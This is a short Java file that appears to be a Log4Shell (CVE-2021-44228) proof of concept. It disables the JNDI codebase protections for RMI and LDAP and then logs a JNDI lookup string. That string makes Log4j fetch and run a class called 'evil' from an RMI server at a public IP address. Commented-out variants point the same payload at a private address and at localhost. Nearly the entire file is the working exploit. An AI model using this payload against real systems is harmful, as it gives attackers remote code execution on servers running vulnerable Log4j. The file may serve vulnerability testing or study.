package com.lichao666;

import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

public class Log4jTest {
    private static final Logger log = LogManager.getLogger();
    public static void main(String[] args) {

//        log.info("${jndi:rmi://172.16.71.207:1099/evil}");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
//        log.error("${jndi:ldap://127.0.0.1:1389/badClassName}");
        log.info("${jndi:rmi://47.104.20.176:1099/evil}");

    }
}
